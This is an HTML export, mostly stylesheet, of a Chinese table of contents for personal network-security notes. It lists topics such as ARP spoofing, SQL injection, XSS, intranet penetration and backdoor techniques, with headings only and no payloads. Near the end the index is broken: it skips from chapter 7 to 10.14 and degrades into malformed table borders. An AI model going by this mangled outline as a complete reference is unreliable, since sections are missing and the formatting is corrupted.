<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>

<link href='https://fonts.loli.net/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext' rel='stylesheet' type='text/css' /><style type='text/css'>html {overflow-x: initial !important;}:root { --bg-color:#ffffff; --text-color:#333333; --select-text-bg-color:#B5D6FC; --select-text-font-color:auto; --monospace:"Lucida Console",Consolas,"Courier",monospace; --title-bar-height:20px; }
.mac-os-11 { --title-bar-height:28px; }
html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; tab-size: 4; }
iframe { margin: auto; }
a.url { word-break: break-all; }
a:active, a:hover { outline: 0px; }
.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
#write.first-line-indent p { text-indent: 2em; }
#write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; }
#write.first-line-indent li { margin-left: 2em; }
.for-image #write { padding-left: 8px; padding-right: 8px; }
body.typora-export { padding-left: 30px; padding-right: 30px; }
.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
.typora-export .task-list-item input { pointer-events: none; }
@media screen and (max-width: 500px) {
  body.typora-export { padding-left: 0px; padding-right: 0px; }
  #write { padding-left: 20px; padding-right: 20px; }
  .CodeMirror-sizer { margin-left: 0px !important; }
  .CodeMirror-gutters { display: none !important; }
}
#write li > figure:last-child { margin-bottom: 0.5rem; }
#write ol, #write ul { position: relative; }
img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
button, input, select, textarea { color: inherit; font: inherit; }
input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
*, ::after, ::before { box-sizing: border-box; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }
p { line-height: inherit; }
h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
p { orphans: 4; }
h1 { font-size: 2rem; }
h2 { font-size: 1.8rem; }
h3 { font-size: 1.6rem; }
h4 { font-size: 1.4rem; }
h5 { font-size: 1.2rem; }
h6 { font-size: 1rem; }
.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
.hidden { display: none; }
.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
a { cursor: pointer; }
sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
figure > table { margin: 0px; }
tr { break-inside: avoid; break-after: auto; }
thead { display: table-header-group; }
table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
table.md-table td { min-width: 32px; }
.CodeMirror-gutters { border-right: 0px; background-color: inherit; }
.CodeMirror-linenumber { user-select: none; }
.CodeMirror { text-align: left; }
.CodeMirror-placeholder { opacity: 0.3; }
.CodeMirror pre { padding: 0px 4px; }
.CodeMirror-lines { padding: 0px; }
div.hr:focus { cursor: none; }
#write pre { white-space: pre-wrap; }
#write.fences-no-line-wrapping pre { white-space: pre; }
#write pre.ty-contain-cm { white-space: normal; }
.CodeMirror-gutters { margin-right: 4px; }
.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
#write .md-fences.mock-cm { white-space: pre-wrap; }
.md-fences.md-fences-with-lineno { padding-left: 0px; }
#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
.CodeMirror-line, twitterwidget { break-inside: avoid; }
.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
.footnotes + .footnotes { margin-top: 0px; }
.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
li div { padding-top: 0px; }
blockquote { margin: 1rem 0px; }
li .mathjax-block, li p { margin: 0.5rem 0px; }
li blockquote { margin: 1rem 0px; }
li { margin: 0px; position: relative; }
blockquote > :last-child { margin-bottom: 0px; }
blockquote > :first-child, li > :first-child { margin-top: 0px; }
.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
#write .footnote-line { white-space: pre-wrap; }
@media print {
  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
  #write { margin-top: 0px; padding-top: 0px; border-color: transparent !important; }
  .typora-export * { -webkit-print-color-adjust: exact; }
  .typora-export #write { break-after: avoid; }
  .typora-export #write::after { height: 0px; }
  .is-mac table { break-inside: avoid; }
  .typora-export-show-outline .typora-export-sidebar { display: none; }
}
.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
a img, img a { cursor: pointer; }
pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
p > .md-image:only-child { display: inline-block; width: 100%; }
#write .MathJax_Display { margin: 0.8em 0px 0px; }
.md-math-block { width: 100%; }
.md-math-block:not(:empty)::after { display: none; }
.MathJax_ref { fill: currentcolor; }
[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
.md-task-list-item { position: relative; list-style-type: none; }
.task-list-item.md-task-list-item { padding-left: 0px; }
.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }
.math { font-size: 1rem; }
.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
.md-toc-content { position: relative; margin-left: 0px; }
.md-toc-content::after, .md-toc::after { display: none; }
.md-toc-item { display: block; color: rgb(65, 131, 196); }
.md-toc-item a { text-decoration: none; }
.md-toc-inner:hover { text-decoration: underline; }
.md-toc-inner { display: inline-block; cursor: pointer; }
.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
.md-toc-h2 .md-toc-inner { margin-left: 2em; }
.md-toc-h3 .md-toc-inner { margin-left: 4em; }
.md-toc-h4 .md-toc-inner { margin-left: 6em; }
.md-toc-h5 .md-toc-inner { margin-left: 8em; }
.md-toc-h6 .md-toc-inner { margin-left: 10em; }
@media screen and (max-width: 48em) {
  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
}
a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
.footnote-line a:not(.reversefootnote) { color: inherit; }
.md-attr { display: none; }
.md-fn-count::after { content: "."; }
code, pre, samp, tt { font-family: var(--monospace); }
kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
code { text-align: left; vertical-align: initial; }
a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
.md-diagram-panel > svg { max-width: 100%; }
[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
[lang="mermaid"] .node text { font-size: 1rem; }
table tr th { border-bottom: 0px; }
video { max-width: 100%; display: block; margin: 0px auto; }
iframe { max-width: 100%; width: 100%; border: none; }
.highlight td, .highlight tr { border: 0px; }
mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
.md-expand mark .md-meta { opacity: 0.3 !important; }
mark .md-meta { color: rgb(0, 0, 0); }
@media print {
  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
}
.md-diagram-panel .messageText { stroke: none !important; }
.md-diagram-panel .start-state { fill: var(--node-fill); }
.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
.md-fences.md-fences-math { font-size: 1em; }
.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
.md-fences-advanced:not(.md-focus) { background: inherit; }
.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
.typora-export-show-outline #write { --webkit-flex:2; flex: 2 1 0%; }
.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
@media screen and (max-width: 1024px) {
  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
}
@media screen and (max-width: 800px) {
  .typora-export-sidebar { display: none; }
}
.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; }
.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
.outline-content strong { font-weight: 400; }
.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
.outline-expander:hover::before { content: ""; }
.outline-h1 > .outline-item { padding-left: 0px; }
.outline-h2 > .outline-item { padding-left: 1em; }
.outline-h3 > .outline-item { padding-left: 2em; }
.outline-h4 > .outline-item { padding-left: 3em; }
.outline-h5 > .outline-item { padding-left: 4em; }
.outline-h6 > .outline-item { padding-left: 5em; }
.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
.outline-label:hover { text-decoration: underline; }
.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }
.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
.outline-children { display: none; }
.info-panel-tab-wrapper { display: none; }
.outline-item-open > .outline-children { display: block; }
.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }
.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
.typora-export-collapse-outline .outline-children { display: none; }
.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
.md-inline-math-container mjx-container { zoom: 0.95; }


:root {
    --side-bar-bg-color: #fafafa;
    --control-text-color: #777;
}

@include-when-export url(https://fonts.loli.net/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext);

/* open-sans-regular - latin-ext_latin */
  /* open-sans-italic - latin-ext_latin */
    /* open-sans-700 - latin-ext_latin */
    /* open-sans-700italic - latin-ext_latin */
  html {
    font-size: 16px;
    -webkit-font-smoothing: antialiased;
}

body {
    font-family: "Open Sans","Clear Sans", "Helvetica Neue", Helvetica, Arial, 'Segoe UI Emoji', sans-serif;
    color: rgb(51, 51, 51);
    line-height: 1.6;
}

#write {
    max-width: 860px;
  	margin: 0 auto;
  	padding: 30px;
    padding-bottom: 100px;
}

@media only screen and (min-width: 1400px) {
	#write {
		max-width: 1024px;
	}
}

@media only screen and (min-width: 1800px) {
	#write {
		max-width: 1200px;
	}
}

#write > ul:first-child,
#write > ol:first-child{
    margin-top: 30px;
}

a {
    color: #4183C4;
}
h1,
h2,
h3,
h4,
h5,
h6 {
    position: relative;
    margin-top: 1rem;
    margin-bottom: 1rem;
    font-weight: bold;
    line-height: 1.4;
    cursor: text;
}
h1:hover a.anchor,
h2:hover a.anchor,
h3:hover a.anchor,
h4:hover a.anchor,
h5:hover a.anchor,
h6:hover a.anchor {
    text-decoration: none;
}
h1 tt,
h1 code {
    font-size: inherit;
}
h2 tt,
h2 code {
    font-size: inherit;
}
h3 tt,
h3 code {
    font-size: inherit;
}
h4 tt,
h4 code {
    font-size: inherit;
}
h5 tt,
h5 code {
    font-size: inherit;
}
h6 tt,
h6 code {
    font-size: inherit;
}
h1 {
    font-size: 2.25em;
    line-height: 1.2;
    border-bottom: 1px solid #eee;
}
h2 {
    font-size: 1.75em;
    line-height: 1.225;
    border-bottom: 1px solid #eee;
}

/*@media print {
    .typora-export h1,
    .typora-export h2 {
        border-bottom: none;
        padding-bottom: initial;
    }

    .typora-export h1::after,
    .typora-export h2::after {
        content: "";
        display: block;
        height: 100px;
        margin-top: -96px;
        border-top: 1px solid #eee;
    }
}*/

h3 {
    font-size: 1.5em;
    line-height: 1.43;
}
h4 {
    font-size: 1.25em;
}
h5 {
    font-size: 1em;
}
h6 {
   font-size: 1em;
    color: #777;
}
p,
blockquote,
ul,
ol,
dl,
table{
    margin: 0.8em 0;
}
li>ol,
li>ul {
    margin: 0 0;
}
hr {
    height: 2px;
    padding: 0;
    margin: 16px 0;
    background-color: #e7e7e7;
    border: 0 none;
    overflow: hidden;
    box-sizing: content-box;
}

li p.first {
    display: inline-block;
}
ul,
ol {
    padding-left: 30px;
}
ul:first-child,
ol:first-child {
    margin-top: 0;
}
ul:last-child,
ol:last-child {
    margin-bottom: 0;
}
blockquote {
    border-left: 4px solid #dfe2e5;
    padding: 0 15px;
    color: #777777;
}
blockquote blockquote {
    padding-right: 0;
}
table {
    padding: 0;
    word-break: initial;
}
table tr {
    border: 1px solid #dfe2e5;
    margin: 0;
    padding: 0;
}
table tr:nth-child(2n),
thead {
    background-color: #f8f8f8;
}
table th {
    font-weight: bold;
    border: 1px solid #dfe2e5;
    border-bottom: 0;
    margin: 0;
    padding: 6px 13px;
}
table td {
    border: 1px solid #dfe2e5;
    margin: 0;
    padding: 6px 13px;
}
table th:first-child,
table td:first-child {
    margin-top: 0;
}
table th:last-child,
table td:last-child {
    margin-bottom: 0;
}

.CodeMirror-lines {
    padding-left: 4px;
}

.code-tooltip {
    box-shadow: 0 1px 1px 0 rgba(0,28,36,.3);
    border-top: 1px solid #eef2f2;
}

.md-fences,
code,
tt {
    border: 1px solid #e7eaed;
    background-color: #f8f8f8;
    border-radius: 3px;
    padding: 0;
    padding: 2px 4px 0px 4px;
    font-size: 0.9em;
}

code {
    background-color: #f3f4f4;
    padding: 0 2px 0 2px;
}

.md-fences {
    margin-bottom: 15px;
    margin-top: 15px;
    padding-top: 8px;
    padding-bottom: 6px;
}


.md-task-list-item > input {
  margin-left: -1.3em;
}

@media print {
    html {
        font-size: 13px;
    }
    table,
    pre {
        page-break-inside: avoid;
    }
    pre {
        word-wrap: break-word;
    }
}

.md-fences {
	background-color: #f8f8f8;
}
#write pre.md-meta-block {
	padding: 1rem;
    font-size: 85%;
    line-height: 1.45;
    background-color: #f7f7f7;
    border: 0;
    border-radius: 3px;
    color: #777777;
    margin-top: 0 !important;
}

.mathjax-block>.code-tooltip {
	bottom: .375rem;
}

.md-mathjax-midline {
    background: #fafafa;
}

#write>h3.md-focus:before{
	left: -1.5625rem;
	top: .375rem;
}
#write>h4.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
#write>h5.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
#write>h6.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
.md-image>.md-meta {
    /*border: 1px solid #ddd;*/
    border-radius: 3px;
    padding: 2px 0px 0px 4px;
    font-size: 0.9em;
    color: inherit;
}

.md-tag {
    color: #a7a7a7;
    opacity: 1;
}

.md-toc { 
    margin-top:20px;
    padding-bottom:20px;
}

.sidebar-tabs {
    border-bottom: none;
}

#typora-quick-open {
    border: 1px solid #ddd;
    background-color: #f8f8f8;
}

#typora-quick-open-item {
    background-color: #FAFAFA;
    border-color: #FEFEFE #e5e5e5 #e5e5e5 #eee;
    border-style: solid;
    border-width: 1px;
}

/** focus mode */
.on-focus-mode blockquote {
    border-left-color: rgba(85, 85, 85, 0.12);
}

header, .context-menu, .megamenu-content, footer{
    font-family: "Segoe UI", "Arial", sans-serif;
}

.file-node-content:hover .file-node-icon,
.file-node-content:hover .file-node-open-state{
    visibility: visible;
}

.mac-seamless-mode #typora-sidebar {
    background-color: #fafafa;
    background-color: var(--side-bar-bg-color);
}

.md-lang {
    color: #b4654d;
}

/*.html-for-mac {
    --item-hover-bg-color: #E6F0FE;
}*/

#md-notification .btn {
    border: 0;
}

.dropdown-menu .divider {
    border-color: #e5e5e5;
    opacity: 0.4;
}

.ty-preferences .window-content {
    background-color: #fafafa;
}

.ty-preferences .nav-group-item.active {
    color: white;
    background: #999;
}

.menu-item-container a.menu-style-btn {
    background-color: #f5f8fa;
    background-image: linear-gradient( 180deg , hsla(0, 0%, 100%, 0.8), hsla(0, 0%, 100%, 0)); 
}



</style><title>网安笔记</title>
</head>
<body class='typora-export os-windows'><div class='typora-export-content'>
<div id='write'  class=''><h1 id='内容索引'><span>内容索引</span></h1><h2 id='1序章'><span>1.</span><a href='#_bookmark0'><span>序章</span></a><span> </span></h2><ol start='' ><li><a href='#11--web-技术演化'><span>Web 技术演化</span></a><span> 1</span></li><li><a href='#1.2网络攻防技术演化'><span>网络攻防技术演化</span></a><span> 5</span></li><li><a href='#1.3网络安全观'><span>网络安全观</span></a><span> 8</span></li><li><a href='#1.4法律与法规'><span>法律与法规</span></a><span> 9</span></li></ol><h2 id='2计算机网络与协议'><span>2.</span><a href='#_bookmark5'><span>计算机网络与协议</span></a><span> </span></h2><ol start='' ><li><a href='#21--网络基础'><span>网络基础</span></a></li><li><a href='#ip协议详解'><span>IP协议详解</span></a></li><li><a href='#icmp协议详解'><span>ICMP协议详解</span></a></li><li><a href='#arp协议详解与arp欺骗中毒）攻击实战'><span>ARP协议详解与ARP欺骗（中毒）攻击实战</span></a></li><li><a href='#22--udp-协议详解代码实战）'><span>UDP 协议详解</span></a><span> 13</span></li><li><a href='#23--tcp-协议'><span>TCP 协议</span></a><span> 14</span></li><li><a href='#24--dhcp-协议'><span>DHCP 协议</span></a><span> 15</span></li><li><a href='#25--路由算法'><span>路由算法</span></a><span> 16</span></li><li><a href='#26--域名系统'><span>域名系统</span></a><span> 18</span></li><li><a href='#27--http-协议簇'><span>HTTP 协议簇</span></a><span> 24</span></li><li><a href='#28--邮件协议族'><span>邮件协议族</span></a><span> 38</span></li><li><a href='#29--ssltls'><span>SSL/TLS</span></a><span> 40</span></li><li><a href='#210--ipsec'><span>IPsec</span></a><span> 44</span></li><li><a href='#211--wi-fi'><span>Wi-Fi</span></a><span> 46</span></li></ol><h2 id='3信息收集-47'><span>3.</span><a href='#_bookmark17'><span>信息收集</span></a><span> 47</span></h2><ol start='' ><li><a href='#31--网络入口信息'><span>网络入口/信息</span></a><span> 47</span></li><li><a href='#32--域名信息'><span>域名信息</span></a><span> 48</span></li><li><a href='#33--端口信息'><span>端口信息</span></a><span> 51</span></li><li><a href='#34--站点信息'><span>站点信息</span></a><span> 56</span></li><li><a href='#35--搜索引擎利用'><span>搜索引擎利用</span></a><span> 58</span></li><li><a href='#36--社会工程学'><span>社会工程学</span></a><span> 60</span></li></ol><h2 id='4常见漏洞攻防-63'><span>4.</span><a href='#_bookmark25'><span>常见漏洞攻防</span></a><span> 63</span></h2><ol start='' ><li><a href='#41--sql-注入'><span>SQL 注入</span></a><span> 63</span></li><li><a href='#42--xss'><span>XSS</span></a><span> 81</span></li><li><a href='#csrf'><span>CSRF</span></a><span> 104</span></li><li><a href='#ssrf'><span>SSRF</span></a><span> 105</span></li><li><a href='#命令注入'><span>命令注入</span></a><span> 110</span></li><li><a href='#目录穿越'><span>目录穿越</span></a><span> 113</span></li><li><a href='#文件读取-1'><span>文件读取</span></a><span> 115</span></li><li><a href='#文件上传'><span>文件上传</span></a><span> 116</span></li><li><a href='#文件包含'><span>文件包含</span></a><span> 118</span></li><li><a href='#xxe'><span>XXE</span></a><span> 120</span></li><li><a href='#模版注入'><span>模版注入</span></a><span> 122</span></li><li><a href='#xpath-注入'><span>Xpath 注入</span></a><span> 125</span></li><li><a href='#逻辑漏洞-业务漏洞'><span>逻辑漏洞 / 业务漏洞</span></a><span> 126</span></li><li><a href='#配置与策略安全'><span>配置与策略安全</span></a><span> 131</span></li><li><a href='#中间件-1'><span>中间件</span></a><span> 132</span></li><li><a href='#web-cache-欺骗攻击'><span>Web Cache 欺骗攻击</span></a><span> 135</span></li><li><a href='#http-请求走私'><span>HTTP 请求走私</span></a><span> 137</span></li></ol><p>&nbsp;</p><h2 id='5语言与框架-141'><span>5.</span><a href='#_bookmark43'><span>语言与框架</span></a><span> 141</span></h2><p><a href='#51--php'><span>5.1 PHP</span></a><span> 141</span></p><p><a href='#52-python'><span>5.2 Python</span></a><span> 166</span></p><p><a href='#53-java'><span>5.3 Java</span></a><span> 171</span></p><ol start='2' ><li><a href='#javascript'><span>JavaScript</span></a><span> 203</span></li><li><a href='#golang'><span>Golang</span></a><span> 217</span></li><li><a href='#ruby'><span>Ruby</span></a><span> 218</span></li></ol><p><a href='#asp'><span>5.7 ASP</span></a><span> 218</span></p><ol start='8' ><li><a href='#powershell'><span>PowerShell</span></a><span> 218</span></li><li><a href='#shell'><span>Shell</span></a><span> 221</span></li><li><a href='#csharp'><span>CSharp</span></a><span> 222</span></li></ol><p>&nbsp;</p><ol start='6' ><li><p><a href='#_bookmark54'><span>内网渗透</span></a><span> 225</span></p><ol start='' ><li><a href='#windows-内网渗透'><span>Windows 内网渗透</span></a><span> 225</span></li><li><a href='#linux-内网渗透'><span>Linux 内网渗透</span></a><span> 248</span></li><li><a href='#后门技术'><span>后门技术</span></a><span> 255</span></li><li><a href='#综合技巧'><span>综合技巧</span></a><span> 258</span></li><li><a href='#参考链接-33'><span>参考链接</span></a><span> 260</span></li></ol></li></ol><p><a href='#_bookmark60'><span>7 云安全</span></a><span> 263</span></p><ol start='' ><li><a href='#容器标准'><span>容器标准</span></a><span> 263</span></li><li><a href='#docker'><span>Docker</span></a><span> 264</span></li><li><a href='#参考链接-35'><span>参考链接</span></a><span> 271</span>
<span>| &gt; </span><a href='#安全开发'><span>10.14 安全开发</span></a><span> . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . |                       |                                                                                               | 357     |</span>
<span>+</span><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><span>+</span><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=+</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=+</span></mark><mark><span>=</span></mark><span>==+</span>
<span>| &gt; </span><a href='#运维'><span>10.15 运维</span></a><span> . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   |                       |                                                                                               | 357     |</span>
<span>+</span>–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>––––––––––—<span>+</span>––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>–––—<span>+</span>
<span>| &gt; </span><a href='#取证'><span>10.16 取证</span></a><span> . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   |                       |                                                                                               | 361     |</span>
<span>+</span>–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>––––––––––—<span>+</span>––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>–––—<span>+</span>
<span>| &gt; </span><a href='#其他-8'><span>10.17 其他</span></a><span> . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . |                       |                                                                                               | 361     |</span>
<span>+</span>–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>––––––––––—<span>+</span>––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>–––—<span>+</span>
<span>| </span><a href='#_bookmark108'><strong><span>11 手册速查</span></strong></a><span>                                                                                            |                       |                                                                                               | </span><strong><span>365</span></strong><span> |</span>
<span>+</span>–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>––––––––––—<span>+</span>––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>–––—<span>+</span>
<span>| </span><a href='#爆破工具'><span>11.1</span></a><span>                                                                                                           | </span><a href='#爆破工具'><span>爆破工具</span></a><span> | . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . | 365     |</span>
<span>+</span>–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>––––––––––—<span>+</span>––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>–––—<span>+</span>
<span>| </span><a href='#下载工具'><span>11.2</span></a><span>                                                                                                           | </span><a href='#下载工具'><span>下载工具</span></a><span> | . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . | 366     |</span>
<span>+</span>–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>––––––––––—<span>+</span>––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>–––—<span>+</span>
<span>| </span><a href='#流量相关'><span>11.3</span></a><span>                                                                                                           | </span><a href='#流量相关'><span>流量相关</span></a><span> | . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . | 367     |</span>
<span>+</span>–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>––––––––––—<span>+</span>––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>–––—<span>+</span>
<span>| </span><a href='#嗅探工具'><span>11.4</span></a><span>                                                                                                           | </span><a href='#嗅探工具'><span>嗅探工具</span></a><span> | . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . | 370     |</span>
